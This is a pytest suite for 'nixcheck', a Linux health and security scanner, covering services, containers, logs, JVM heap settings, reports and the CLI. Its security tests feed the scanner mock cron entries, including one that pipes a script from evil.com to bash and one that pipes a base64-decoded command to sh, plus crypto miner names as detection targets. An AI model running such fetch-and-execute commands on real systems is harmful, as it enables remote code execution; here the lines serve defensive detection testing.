"""Functional tests for nixcheck collectors, graph, reporter, and CLI."""

import json
from pathlib import Path
import sys
from unittest.mock import MagicMock, mock_open, patch

sys.path.insert(0, str(Path(__file__).parent.parent))

from nixcheck.collectors import (
    collect_services,
    collect_containers,
    collect_resource_usage,
    collect_journal_errors,
    collect_var_log_errors,
    detect_java_processes,
    analyze_jvm_config,
    collect_security_issues,
    run_cmd,
)
from nixcheck.graph import build_graph, run_nixcheck, should_analyze_jvm
from nixcheck.models import (
    JVMConfig,
    LogError,
    NixCheckState,
    ResourceUsage,
    SecurityIssue,
    ServiceInfo,
    Severity,
)
from nixcheck.reporter import generate_report, generate_json_summary, severity_emoji


# ──────────────────────────────────────────────
#  run_cmd
# ──────────────────────────────────────────────

class TestRunCmd:
    """Tests for the run_cmd helper."""

    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0, stdout="ok\n", stderr="")
        code, out, err = run_cmd(["echo", "hello"])
        assert code == 0
        assert out == "ok\n"
        assert err == ""

    @patch("subprocess.run")
    def test_timeout(self, mock_run):
        import subprocess
        mock_run.side_effect = subprocess.TimeoutExpired(cmd=["sleep"], timeout=30)
        code, out, err = run_cmd(["sleep", "60"], timeout=1)
        assert code == -1
        assert "timed out" in err.lower()

    @patch("subprocess.run")
    def test_command_not_found(self, mock_run):
        mock_run.side_effect = FileNotFoundError
        code, out, err = run_cmd(["nonexistent"])
        assert code == -1
        assert "not found" in err


# ──────────────────────────────────────────────
#  collect_services
# ──────────────────────────────────────────────

class TestCollectServices:
    """Tests for service collection."""

    @patch("nixcheck.collectors.run_cmd")
    def test_no_services(self, mock_run_cmd):
        mock_run_cmd.return_value = (0, "", "")
        services = collect_services()
        assert services == []

    @patch("nixcheck.collectors.run_cmd")
    def test_services_parsed(self, mock_run_cmd):
        call_count = [0]
        def side_effect(cmd, timeout=30):
            call_count[0] += 1
            if "list-units" in cmd:
                return (0, "sshd.service loaded active running OpenSSH server daemon\nnginx.service loaded active running A high performance web server\n", "")
            if "list-unit-files" in cmd:
                return (0, "sshd.service enabled\nnginx.service disabled\n", "")
            if "show" in str(cmd):
                return (0, "MainPID=1234\nMemoryCurrent=10485760\nActiveState=active\nLoadState=loaded\n", "")
            return (0, "", "")
        mock_run_cmd.side_effect = side_effect
        services = collect_services()
        assert len(services) == 2
        assert services[0].name == "sshd"
        assert services[1].name == "nginx"
        assert services[0].enabled is True
        assert services[1].enabled is False

    @patch("nixcheck.collectors.run_cmd")
    def test_systemctl_failure(self, mock_run_cmd):
        mock_run_cmd.return_value = (1, "", "Failed to connect to bus")
        services = collect_services()
        assert services == []


# ──────────────────────────────────────────────
#  collect_containers
# ──────────────────────────────────────────────

class TestCollectContainers:
    """Tests for container collection."""

    @patch("nixcheck.collectors.run_cmd")
    def test_no_containers(self, mock_run_cmd):
        mock_run_cmd.return_value = (1, "", "docker: command not found")
        containers = collect_containers()
        assert containers == []

    @patch("nixcheck.collectors.run_cmd")
    def test_docker_containers(self, mock_run_cmd):
        call_count = [0]
        def side_effect(cmd, timeout=30):
            call_count[0] += 1
            if cmd[0] == "docker":
                container_json = json.dumps({
                    "ID": "abc123def456", "Image": "nginx:latest",
                    "Names": "web-server", "Status": "Up"
                })
                return (0, container_json + "\n", "")
            return (1, "", "")
        mock_run_cmd.side_effect = side_effect
        containers = collect_containers()
        assert len(containers) == 1
        assert containers[0].name == "web-server"
        assert containers[0].is_container is True
        assert containers[0].container_id == "abc123def456"

    @patch("nixcheck.collectors.run_cmd")
    def test_podman_containers(self, mock_run_cmd):
        call_count = [0]
        def side_effect(cmd, timeout=30):
            call_count[0] += 1
            if cmd[0] == "docker":
                return (1, "", "")
            if cmd[0] == "podman":
                container_json = json.dumps({
                    "ID": "pod123pod456", "Image": "alpine:latest",
                    "Names": "test-container", "Status": "Up"
                })
                return (0, container_json + "\n", "")
            return (1, "", "")
        mock_run_cmd.side_effect = side_effect
        containers = collect_containers()
        assert len(containers) == 1
        assert containers[0].name == "test-container"

    @patch("nixcheck.collectors.run_cmd")
    def test_invalid_json(self, mock_run_cmd):
        mock_run_cmd.return_value = (0, "not-valid-json\n", "")
        containers = collect_containers()
        assert containers == []


# ──────────────────────────────────────────────
#  collect_resource_usage
# ──────────────────────────────────────────────

class TestCollectResourceUsage:
    """Tests for resource usage collection."""

    @patch("psutil.cpu_percent")
    @patch("psutil.cpu_count")
    @patch("psutil.virtual_memory")
    @patch("psutil.disk_usage")
    @patch("psutil.swap_memory")
    @patch("os.getloadavg")
    def test_normal_collection(self, mock_loadavg, mock_swap, mock_disk, mock_mem,
                                mock_cpu_count, mock_cpu_percent):
        mock_cpu_percent.return_value = 45.0
        mock_cpu_count.return_value = 8
        mock_mem.return_value = MagicMock(
            percent=60.0, total=16 * 1024**3, used=9.6 * 1024**3,
            available=6.4 * 1024**3
        )
        mock_disk.return_value = MagicMock(
            percent=35.0, total=500 * 1024**3, used=175 * 1024**3,
            free=325 * 1024**3
        )
        mock_loadavg.return_value = (1.2, 1.5, 1.8)
        mock_swap.return_value = MagicMock(percent=5.0, total=2 * 1024**3)

        usage = collect_resource_usage()
        assert usage is not None
        assert usage.cpu_percent == 45.0
        assert usage.cpu_cores == 8
        assert usage.memory_percent == 60.0
        assert usage.disk_percent == 35.0
        assert usage.load_average == (1.2, 1.5, 1.8)
        assert usage.swap_percent == 5.0

    @patch("psutil.cpu_percent")
    @patch("psutil.cpu_count")
    @patch("psutil.virtual_memory")
    @patch("psutil.disk_usage")
    @patch("psutil.swap_memory")
    @patch("os.getloadavg")
    def test_no_swap(self, mock_loadavg, mock_swap, mock_disk, mock_mem,
                     mock_cpu_count, mock_cpu_percent):
        mock_cpu_percent.return_value = 10.0
        mock_cpu_count.return_value = 4
        mock_mem.return_value = MagicMock(
            percent=30.0, total=8 * 1024**3, used=2.4 * 1024**3,
            available=5.6 * 1024**3
        )
        mock_disk.return_value = MagicMock(
            percent=20.0, total=256 * 1024**3, used=51.2 * 1024**3,
            free=204.8 * 1024**3
        )
        mock_loadavg.return_value = (0.5, 0.3, 0.1)
        mock_swap.return_value = MagicMock(percent=0.0, total=0)

        usage = collect_resource_usage()
        assert usage is not None
        assert usage.swap_percent is None

    @patch("psutil.cpu_percent")
    def test_collection_failure(self, mock_cpu_percent):
        mock_cpu_percent.side_effect = OSError("Permission denied")
        usage = collect_resource_usage()
        assert usage is None


# ──────────────────────────────────────────────
#  log collection
# ──────────────────────────────────────────────

class TestLogCollection:
    """Tests for journal and var/log error collection."""

    @patch("nixcheck.collectors.run_cmd")
    def test_journal_errors(self, mock_run_cmd):
        journal_entry = json.dumps({
            "MESSAGE": "disk failure on /dev/sda1",
            "_COMM": "kernel",
            "PRIORITY": "3",
            "__REALTIME_TIMESTAMP": "1234567890"
        })
        mock_run_cmd.return_value = (0, journal_entry + "\n", "")
        errors = collect_journal_errors(limit=100)
        assert len(errors) == 1
        assert errors[0].source == "kernel"
        assert "disk failure" in errors[0].message
        assert errors[0].severity == Severity.HIGH

    @patch("nixcheck.collectors.run_cmd")
    def test_journal_critical(self, mock_run_cmd):
        journal_entry = json.dumps({
            "MESSAGE": "critical: kernel panic",
            "_COMM": "kernel",
            "PRIORITY": "1",
        })
        mock_run_cmd.return_value = (0, journal_entry + "\n", "")
        errors = collect_journal_errors(limit=100)
        assert len(errors) == 1
        assert errors[0].severity == Severity.CRITICAL

    @patch("nixcheck.collectors.run_cmd")
    def test_journal_empty(self, mock_run_cmd):
        mock_run_cmd.return_value = (0, "", "")
        errors = collect_journal_errors(limit=100)
        assert errors == []

    @patch("nixcheck.collectors.run_cmd")
    def test_journal_failure(self, mock_run_cmd):
        mock_run_cmd.return_value = (1, "", "Cannot access journal")
        errors = collect_journal_errors(limit=100)
        assert errors == []

    @patch("nixcheck.collectors.run_cmd")
    def test_journal_invalid_json(self, mock_run_cmd):
        mock_run_cmd.return_value = (0, "not-json\n", "")
        errors = collect_journal_errors(limit=100)
        assert errors == []

    @patch("nixcheck.collectors.run_cmd")
    def test_journal_limit(self, mock_run_cmd):
        lines = []
        for i in range(10):
            entry = json.dumps({
                "MESSAGE": f"error number {i}",
                "_COMM": "test",
                "PRIORITY": "4",
            })
            lines.append(entry)
        mock_run_cmd.return_value = (0, "\n".join(lines), "")
        errors = collect_journal_errors(limit=3)
        assert len(errors) == 3

    @patch("builtins.open", new_callable=mock_open,
           read_data="Jan 01 error: something failed\nJan 02 info: all good\nJan 03 CRITICAL: system crash\n")
    @patch("pathlib.Path.exists")
    def test_var_log_errors(self, mock_exists, mock_file):
        mock_exists.return_value = True
        with patch("pathlib.Path.read_text", return_value="Jan 01 error: something failed\nJan 02 info: all good\nJan 03 CRITICAL: system crash\n"):
            errors = collect_var_log_errors()
            # Only lines matching error/fail/critical/warn pattern
            assert len(errors) >= 2  # error line + critical line
            severities = [e.severity for e in errors]
            assert Severity.HIGH in severities  # the CRITICAL line
            assert Severity.MEDIUM in severities  # the error line

    @patch("pathlib.Path.exists")
    def test_var_log_missing_files(self, mock_exists):
        mock_exists.return_value = False
        errors = collect_var_log_errors()
        assert errors == []


# ──────────────────────────────────────────────
#  Java process detection & JVM analysis
# ──────────────────────────────────────────────

class TestJavaDetection:
    """Tests for Java process detection and JVM analysis."""

    def test_analyze_jvm_with_xmx(self):
        proc = {"pid": 1234, "name": "java", "cmdline": ["java", "-Xmx1024M", "-Xms512M", "-jar", "app.jar"]}
        config = analyze_jvm_config(proc)
        assert config is not None
        assert config.xmx_found is True
        assert config.xms_found is True
        assert config.heap_max_mb == 1024.0
        assert config.heap_min_mb == 512.0

    def test_analyze_jvm_no_xmx(self):
        proc = {"pid": 5678, "name": "java", "cmdline": ["java", "-jar", "app.jar"]}
        config = analyze_jvm_config(proc)
        assert config is not None
        assert config.xmx_found is False
        assert len(config.recommendations) >= 1
        assert "No -Xmx" in config.recommendations[0]

    def test_analyze_jvm_small_heap(self):
        proc = {"pid": 9999, "name": "java", "cmdline": ["java", "-Xmx128M"]}
        config = analyze_jvm_config(proc)
        assert config is not None
        assert config.heap_max_mb == 128.0
        assert any("Small heap" in r for r in config.recommendations)

    def test_analyze_jvm_gigabytes(self):
        proc = {"pid": 1, "name": "java", "cmdline": ["java", "-Xmx4G", "-Xms2G"]}
        config = analyze_jvm_config(proc)
        assert config is not None
        assert config.heap_max_mb == 4096.0
        assert config.heap_min_mb == 2048.0

    def test_analyze_jvm_kilobytes(self):
        proc = {"pid": 1, "name": "java", "cmdline": ["java", "-Xmx512K"]}
        config = analyze_jvm_config(proc)
        assert config is not None
        assert config.heap_max_mb == 0.5

    def test_analyze_jvm_with_properties(self):
        proc = {"pid": 1, "name": "java", "cmdline": ["java", "-Dapp.config=/etc/app/application.properties"]}
        config = analyze_jvm_config(proc)
        assert config is not None
        assert config.properties_file == "/etc/app/application.properties"

    @patch("psutil.process_iter")
    def test_detect_java_processes(self, mock_process_iter):
        proc1 = MagicMock()
        proc1.info = {"pid": 100, "name": "java", "cmdline": ["java", "-jar", "app.jar"]}
        proc2 = MagicMock()
        proc2.info = {"pid": 200, "name": "python3", "cmdline": ["python3", "script.py"]}
        proc3 = MagicMock()
        proc3.info = {"pid": 300, "name": "my-java-app", "cmdline": ["/usr/bin/java", "-Xmx512M"]}
        mock_process_iter.return_value = [proc1, proc2, proc3]

        java_procs = detect_java_processes()
        assert len(java_procs) == 2
        pids = [p["pid"] for p in java_procs]
        assert 100 in pids
        assert 300 in pids

    @patch("psutil.process_iter")
    def test_detect_java_no_processes(self, mock_process_iter):
        mock_process_iter.return_value = []
        java_procs = detect_java_processes()
        assert java_procs == []


# ──────────────────────────────────────────────
#  load_miner_names
# ──────────────────────────────────────────────

class TestLoadMinerNames:
    """Tests for crypto miner name loading."""

    def test_defaults(self):
        from nixcheck.collectors import load_miner_names, CRYPTO_MINER_NAMES
        names = load_miner_names()
        assert names == CRYPTO_MINER_NAMES
        assert "xmrig" in names
        assert len(names) == 18

    @patch("pathlib.Path.exists", return_value=False)
    def test_missing_file_falls_back(self, mock_exists):
        from nixcheck.collectors import load_miner_names, CRYPTO_MINER_NAMES
        names = load_miner_names("/nonexistent/miners.yaml")
        assert names == CRYPTO_MINER_NAMES

    @patch("pathlib.Path.exists", return_value=True)
    @patch("pathlib.Path.read_text")
    def test_yaml_file(self, mock_read, mock_exists):
        mock_read.return_value = "miners:\n  - custom-miner\n  - other-miner\n"
        # Need yaml to be available
        try:
            import yaml  # noqa: F401
        except ImportError:
            import pytest
            pytest.skip("PyYAML not installed")
        from nixcheck.collectors import load_miner_names
        names = load_miner_names("/tmp/test.yaml")
        assert "custom-miner" in names
        assert "other-miner" in names
        assert "xmrig" not in names  # not in custom list

    @patch("pathlib.Path.exists", return_value=True)
    @patch("pathlib.Path.read_text")
    def test_json_file(self, mock_read, mock_exists):
        mock_read.return_value = '{"miners": ["json-miner", "another"]}'
        from nixcheck.collectors import load_miner_names
        names = load_miner_names("/tmp/test.json")
        assert "json-miner" in names
        assert "another" in names

    @patch("pathlib.Path.exists", return_value=True)
    @patch("pathlib.Path.read_text")
    def test_text_file(self, mock_read, mock_exists):
        mock_read.return_value = "miner-one\nminer-two\n# comment\nminer-three\n"
        from nixcheck.collectors import load_miner_names
        names = load_miner_names("/tmp/miners.txt")
        assert "miner-one" in names
        assert "miner-two" in names
        assert "miner-three" in names
        assert "# comment" not in names

    @patch("pathlib.Path.exists", return_value=True)
    @patch("pathlib.Path.read_text")
    def test_json_list_format(self, mock_read, mock_exists):
        mock_read.return_value = '["a", "b", "c"]'
        from nixcheck.collectors import load_miner_names
        names = load_miner_names("/tmp/test.json")
        assert names == {"a", "b", "c"}


# ──────────────────────────────────────────────
#  security issues
# ──────────────────────────────────────────────

class TestSecurityIssues:
    """Tests for security issue detection."""

    @patch("psutil.process_iter")
    def test_no_issues(self, mock_process_iter):
        proc = MagicMock()
        proc.info = {"pid": 100, "name": "sshd", "cmdline": ["/usr/sbin/sshd"], "cpu_percent": 5.0}
        proc.cpu_percent.return_value = 5.0
        mock_process_iter.return_value = [proc]

        with patch("pathlib.Path.exists", return_value=False):
            issues = collect_security_issues()
            assert issues == []

    @patch("psutil.process_iter")
    def test_crypto_miner_detected(self, mock_process_iter):
        proc = MagicMock()
        proc.info = {"pid": 666, "name": "xmrig", "cmdline": ["xmrig", "--threads=4"], "cpu_percent": 99.0}
        mock_process_iter.return_value = [proc]

        with patch("pathlib.Path.exists", return_value=False):
            issues = collect_security_issues()
            assert len(issues) >= 1
            assert issues[0].issue_type == "crypto_miner"
            assert issues[0].severity == Severity.CRITICAL
            assert issues[0].remediation is not None

    @patch("psutil.process_iter")
    def test_miner_in_cmdline(self, mock_process_iter):
        proc = MagicMock()
        proc.info = {"pid": 777, "name": "bash", "cmdline": ["bash", "-c", "./cpuminer -a sha256"], "cpu_percent": 95.0}
        proc.cpu_percent.return_value = 95.0
        mock_process_iter.return_value = [proc]

        with patch("pathlib.Path.exists", return_value=False):
            issues = collect_security_issues()
            assert len(issues) >= 1
            assert issues[0].issue_type == "crypto_miner"

    @patch("psutil.process_iter")
    def test_custom_miner_names(self, mock_process_iter):
        """Test that custom miner names are used when provided."""
        proc = MagicMock()
        proc.info = {"pid": 999, "name": "custom-threat", "cmdline": ["custom-threat"], "cpu_percent": 99.0}
        proc.cpu_percent.return_value = 99.0
        mock_process_iter.return_value = [proc]

        with patch("pathlib.Path.exists", return_value=False):
            # With default names, custom-threat should NOT be flagged as miner
            issues_default = collect_security_issues()
            miner_issues = [i for i in issues_default if i.issue_type == "crypto_miner"]
            assert miner_issues == []

            # With custom names, it should be flagged
            issues_custom = collect_security_issues(miner_names={"custom-threat", "evil"})
            miner_issues = [i for i in issues_custom if i.issue_type == "crypto_miner"]
            assert len(miner_issues) == 1
            assert miner_issues[0].details["pid"] == 999

    @patch("psutil.process_iter")
    def test_high_cpu_process(self, mock_process_iter):
        proc = MagicMock()
        proc.info = {"pid": 888, "name": "unknown-app", "cmdline": ["unknown-app"], "cpu_percent": 95.0}
        proc.cpu_percent.return_value = 95.0
        mock_process_iter.return_value = [proc]

        with patch("pathlib.Path.exists", return_value=False):
            issues = collect_security_issues()
            high_cpu = [i for i in issues if i.issue_type == "high_cpu_process"]
            assert len(high_cpu) >= 1
            assert high_cpu[0].severity == Severity.MEDIUM

    @patch("psutil.process_iter")
    def test_benign_process_not_flagged(self, mock_process_iter):
        proc = MagicMock()
        proc.info = {"pid": 100, "name": "python3", "cmdline": ["python3"], "cpu_percent": 90.0}
        proc.cpu_percent.return_value = 90.0
        mock_process_iter.return_value = [proc]

        with patch("pathlib.Path.exists", return_value=False):
            issues = collect_security_issues()
            high_cpu = [i for i in issues if i.issue_type == "high_cpu_process"]
            assert high_cpu == []  # python3 is benign

    @patch("psutil.process_iter")
    def test_miner_not_also_reported_as_high_cpu(self, mock_process_iter):
        """A miner should not be double-reported as high_cpu_process."""
        proc = MagicMock()
        proc.info = {"pid": 666, "name": "xmrig", "cmdline": ["xmrig"], "cpu_percent": 99.0}
        proc.cpu_percent.return_value = 99.0
        mock_process_iter.return_value = [proc]

        with patch("pathlib.Path.exists", return_value=False):
            issues = collect_security_issues()
            issue_types = [i.issue_type for i in issues]
            assert "crypto_miner" in issue_types
            assert "high_cpu_process" not in issue_types

    @patch("pathlib.Path.exists")
    @patch("pathlib.Path.read_text")
    @patch("psutil.process_iter")
    def test_suspicious_cron_detected(self, mock_process_iter, mock_read_text, mock_exists):
        mock_process_iter.return_value = []
        mock_exists.return_value = True
        mock_read_text.return_value = "0 * * * * root curl http://evil.com/script.sh | bash\n"

        issues = collect_security_issues()
        cron_issues = [i for i in issues if i.issue_type == "suspicious_cron"]
        assert len(cron_issues) >= 1
        assert cron_issues[0].severity == Severity.HIGH

    @patch("pathlib.Path.exists")
    @patch("pathlib.Path.read_text")
    @patch("psutil.process_iter")
    def test_base64_cron_detected(self, mock_process_iter, mock_read_text, mock_exists):
        mock_process_iter.return_value = []
        mock_exists.return_value = True
        mock_read_text.return_value = "*/5 * * * * root echo d2hvYW1p | base64 -d | sh\n"

        issues = collect_security_issues()
        cron_issues = [i for i in issues if i.issue_type == "suspicious_cron"]
        assert len(cron_issues) >= 1


# ──────────────────────────────────────────────
#  reporter
# ──────────────────────────────────────────────

class TestReporter:
    """Tests for report generation."""

    def test_severity_emoji(self):
        assert severity_emoji(Severity.CRITICAL) == "🔴"
        assert severity_emoji(Severity.HIGH) == "🟠"
        assert severity_emoji(Severity.MEDIUM) == "🟡"
        assert severity_emoji(Severity.LOW) == "🟢"
        assert severity_emoji(Severity.INFO) == "ℹ️"

    def test_generate_report_healthy(self):
        state = NixCheckState(hostname="test-server")
        state.resource_usage = ResourceUsage(
            cpu_percent=10.0, cpu_cores=4, memory_percent=30.0,
            memory_total_gb=16.0, memory_used_gb=4.8, memory_available_gb=11.2,
            disk_percent=25.0, disk_total_gb=500.0, disk_used_gb=125.0,
            disk_available_gb=375.0, load_average=(0.5, 0.3, 0.2), swap_percent=0.0
        )
        state.services = [ServiceInfo(name="sshd", status="running")]
        report = generate_report(state)
        assert "test-server" in report
        assert "✅" in report
        assert "SYSTEM RESOURCES" in report
        assert "SERVICES RUNNING" in report
        assert "healthy" in report

    def test_generate_report_with_warnings(self):
        state = NixCheckState(hostname="prod-server")
        state.resource_usage = ResourceUsage(
            cpu_percent=95.0, cpu_cores=2, memory_percent=92.0,
            memory_total_gb=8.0, memory_used_gb=7.36, memory_available_gb=0.64,
            disk_percent=88.0, disk_total_gb=100.0, disk_used_gb=88.0,
            disk_available_gb=12.0, load_average=(5.0, 4.0, 3.0), swap_percent=45.0
        )
        state.log_errors = [
            LogError(source="kernel", message="BUG: unable to handle kernel NULL pointer",
                     severity=Severity.CRITICAL),
            LogError(source="sshd", message="Failed password for root",
                     severity=Severity.HIGH),
        ]
        state.security_issues = [
            SecurityIssue(issue_type="crypto_miner", severity=Severity.CRITICAL,
                          description="Miner detected", remediation="Kill it"),
        ]
        state.check_security = True
        report = generate_report(state)
        assert "⚠️" in report
        assert "WARNINGS" in report
        assert "High CPU usage" in report or "95" in report
        assert "CRITICAL" in report

    def test_generate_report_no_resources(self):
        state = NixCheckState(hostname="minimal")
        report = generate_report(state)
        assert "Unable to collect" in report

    def test_generate_report_with_jvm(self):
        state = NixCheckState(hostname="java-host")
        state.java_detected = True
        state.jvm_configs = [
            JVMConfig(java_process="java", pid=1234, heap_max_mb=512.0, xmx_found=True,
                      recommendations=["Small heap size (512.0MB) may cause performance issues"]),
        ]
        report = generate_report(state)
        assert "JAVA PROCESSES" in report
        assert "512" in report
        assert "Small heap" in report

    def test_json_summary(self):
        state = NixCheckState(hostname="json-host")
        state.resource_usage = ResourceUsage(
            cpu_percent=50.0, cpu_cores=4, memory_percent=60.0,
            memory_total_gb=16.0, memory_used_gb=9.6, memory_available_gb=6.4,
            disk_percent=40.0, disk_total_gb=500.0, disk_used_gb=200.0,
            disk_available_gb=300.0, load_average=(1.0, 1.5, 2.0), swap_percent=10.0
        )
        state.services = [ServiceInfo(name="nginx", status="running")]
        state.containers = [ServiceInfo(name="redis", status="running", is_container=True, container_id="abc123")]
        state.log_errors = [LogError(source="app", message="error", severity=Severity.HIGH)]
        state.security_issues = [SecurityIssue(issue_type="test", severity=Severity.LOW, description="test")]
        state.check_security = True

        summary = generate_json_summary(state)
        assert summary["hostname"] == "json-host"
        assert summary["services_count"] == 1
        assert summary["containers_count"] == 1
        assert summary["resources"]["cpu_percent"] == 50.0
        assert summary["errors_count"] == 1
        assert summary["security_issues_count"] == 1
        assert summary["has_warnings"] is True

    def test_json_summary_no_warnings(self):
        state = NixCheckState(hostname="clean")
        state.resource_usage = ResourceUsage(
            cpu_percent=10.0, cpu_cores=4, memory_percent=20.0,
            memory_total_gb=16.0, memory_used_gb=3.2, memory_available_gb=12.8,
            disk_percent=15.0, disk_total_gb=500.0, disk_used_gb=75.0,
            disk_available_gb=425.0, load_average=(0.1, 0.2, 0.3), swap_percent=0.0
        )
        summary = generate_json_summary(state)
        assert summary["has_warnings"] is False

    def test_json_summary_no_resources(self):
        state = NixCheckState(hostname="nores")
        summary = generate_json_summary(state)
        assert summary["resources"]["cpu_percent"] is None


# ──────────────────────────────────────────────
#  graph workflow
# ──────────────────────────────────────────────

class TestGraphWorkflow:
    """Tests for the LangGraph workflow."""

    def test_should_analyze_jvm_true(self):
        state = NixCheckState()
        state.java_detected = True
        assert should_analyze_jvm(state) == "analyze_jvm"

    def test_should_analyze_jvm_false(self):
        state = NixCheckState()
        state.java_detected = False
        assert should_analyze_jvm(state) == "report"

    def test_build_graph(self):
        graph = build_graph()
        assert graph is not None
        # Verify graph can be compiled
        app = graph.compile()
        assert app is not None

    @patch("nixcheck.graph.collect_security_issues")
    @patch("nixcheck.graph.detect_java_processes")
    @patch("nixcheck.graph.collect_var_log_errors")
    @patch("nixcheck.graph.collect_journal_errors")
    @patch("nixcheck.graph.collect_resource_usage")
    @patch("nixcheck.graph.collect_containers")
    @patch("nixcheck.graph.collect_services")
    def test_run_nixcheck_full(self, mock_services, mock_containers,
                                mock_resources, mock_journal, mock_varlog,
                                mock_java, mock_security):
        mock_services.return_value = [ServiceInfo(name="sshd", status="running")]
        mock_containers.return_value = [
            ServiceInfo(name="nginx", status="running", is_container=True, container_id="abc123"),
        ]
        mock_resources.return_value = ResourceUsage(
            cpu_percent=20.0, cpu_cores=2, memory_percent=40.0,
            memory_total_gb=8.0, memory_used_gb=3.2, memory_available_gb=4.8,
            disk_percent=30.0, disk_total_gb=200.0, disk_used_gb=60.0,
            disk_available_gb=140.0, load_average=(0.5, 0.3, 0.2), swap_percent=None
        )
        mock_journal.return_value = []
        mock_varlog.return_value = []
        mock_java.return_value = [
            {"pid": 100, "name": "java", "cmdline": ["java", "-Xmx512M"]},
        ]
        mock_security.return_value = []

        result = run_nixcheck(hostname="test-full", check_containers=True,
                             check_security=True, log_lines_limit=500)
        assert result is not None
        assert result["hostname"] == "test-full"
        assert len(result["services"]) == 1
        assert len(result["containers"]) == 1
        assert result["resource_usage"] is not None
        assert result["java_detected"] is True
        assert len(result["jvm_configs"]) >= 1
        assert result["report"] is not None

    @patch("nixcheck.graph.collect_security_issues")
    @patch("nixcheck.graph.detect_java_processes")
    @patch("nixcheck.graph.collect_var_log_errors")
    @patch("nixcheck.graph.collect_journal_errors")
    @patch("nixcheck.graph.collect_resource_usage")
    @patch("nixcheck.graph.collect_containers")
    @patch("nixcheck.graph.collect_services")
    def test_run_nixcheck_skipping_checks(self, mock_services, mock_containers,
                                          mock_resources, mock_journal, mock_varlog,
                                          mock_java, mock_security):
        mock_services.return_value = []
        mock_containers.return_value = []
        mock_resources.return_value = None
        mock_journal.return_value = []
        mock_varlog.return_value = []
        mock_java.return_value = []  # no java
        mock_security.return_value = []

        result = run_nixcheck(hostname="minimal", check_containers=False,
                             check_security=False)
        assert result is not None
        assert result["containers"] == []
        assert result["security_issues"] == []
        assert result["security_concerns"] is False
        assert result["report"] is not None


# ──────────────────────────────────────────────
#  CLI
# ──────────────────────────────────────────────

class TestCLI:
    """Tests for CLI argument parsing and behavior."""

    @patch("nixcheck.cli.run_nixcheck")
    @patch("sys.argv", ["nixcheck", "--hostname", "my-server", "--json"])
    def test_json_output(self, mock_run):
        state = NixCheckState(hostname="my-server")
        state.resource_usage = ResourceUsage(
            cpu_percent=10.0, cpu_cores=4, memory_percent=20.0,
            memory_total_gb=16.0, memory_used_gb=3.2, memory_available_gb=12.8,
            disk_percent=15.0, disk_total_gb=500.0, disk_used_gb=75.0,
            disk_available_gb=425.0, load_average=(0.1, 0.2, 0.3), swap_percent=0.0
        )
        mock_run.return_value = state

        from nixcheck.cli import main
        import io
        import sys
        original_stdout = sys.stdout
        sys.stdout = io.StringIO()
        try:
            exit_code = 0
            try:
                main()
            except SystemExit as e:
                exit_code = e.code
        finally:
            output = sys.stdout.getvalue()
            sys.stdout = original_stdout

        # Rich console prints before JSON, so extract only from first '{'
        json_start = output.find("{")
        assert json_start >= 0, f"No JSON found in output: {output[:200]}"
        json_str = output[json_start:]
        assert exit_code == 0 or exit_code is None
        parsed = json.loads(json_str)
        assert parsed["hostname"] == "my-server"

    @patch("nixcheck.cli.run_nixcheck")
    @patch("sys.argv", ["nixcheck", "--quiet"])
    def test_quiet_mode(self, mock_run):
        state = NixCheckState(hostname="localhost")
        state.resource_usage = ResourceUsage(
            cpu_percent=10.0, cpu_cores=4, memory_percent=20.0,
            memory_total_gb=16.0, memory_used_gb=3.2, memory_available_gb=12.8,
            disk_percent=15.0, disk_total_gb=500.0, disk_used_gb=75.0,
            disk_available_gb=425.0, load_average=(0.1, 0.2, 0.3), swap_percent=0.0
        )
        mock_run.return_value = state

        from nixcheck.cli import main
        import io
        import sys
        original_stdout = sys.stdout
        sys.stdout = io.StringIO()
        try:
            try:
                main()
            except SystemExit:
                pass
        finally:
            output = sys.stdout.getvalue()
            sys.stdout = original_stdout

        assert "healthy" in output

    @patch("nixcheck.cli.run_nixcheck")
    @patch("sys.argv", ["nixcheck", "--verbose", "--log-lines", "500", "--threshold", "90"])
    def test_custom_options(self, mock_run):
        state = NixCheckState(hostname="localhost")
        state.report = "ok"
        mock_run.return_value = state

        from nixcheck.cli import main
        import io
        import sys
        original_stdout = sys.stdout
        sys.stdout = io.StringIO()
        try:
            try:
                main()
            except SystemExit:
                pass
        finally:
            sys.stdout = original_stdout

        mock_run.assert_called_once_with(
            hostname="localhost",
            check_containers=True,
            check_security=True,
            log_lines_limit=500,
            resource_warning_threshold=90.0,
            miner_list_path=None,
            fast_mode=False,
        )

    @patch("nixcheck.cli.run_nixcheck")
    @patch("sys.argv", ["nixcheck", "--miner-list", "/etc/custom-miners.yaml"])
    def test_miner_list_option(self, mock_run):
        state = NixCheckState(hostname="localhost")
        state.report = "ok"
        mock_run.return_value = state

        from nixcheck.cli import main
        import io
        import sys
        original_stdout = sys.stdout
        sys.stdout = io.StringIO()
        try:
            try:
                main()
            except SystemExit:
                pass
        finally:
            sys.stdout = original_stdout

        mock_run.assert_called_once()
        _, kwargs = mock_run.call_args
        assert kwargs["miner_list_path"] == "/etc/custom-miners.yaml"
